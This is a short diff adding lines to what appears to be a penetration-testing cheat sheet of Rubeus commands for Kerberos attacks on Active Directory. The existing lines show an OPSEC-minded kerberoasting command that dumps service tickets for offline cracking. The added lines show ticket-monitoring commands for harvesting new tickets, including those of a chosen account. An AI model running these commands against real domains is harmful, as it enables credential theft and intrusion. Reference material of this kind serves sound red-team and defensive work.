@@ -21,3 +21,9 @@
 # request kerberoast TGS all users an save to file (OPSEC)
 .\Rubeus.exe kerberoast /rc4opsec /outfile:<outfile-path>
 
+# monitor for new tickets
+.\Rubeus.exe monitor /interval:<interval> /nowrap
+
+# monitor for new tickets of specific account
+.\Rubeus.exe monitor /targetuser:<targetuser> /interval:<interval> /nowrap
+
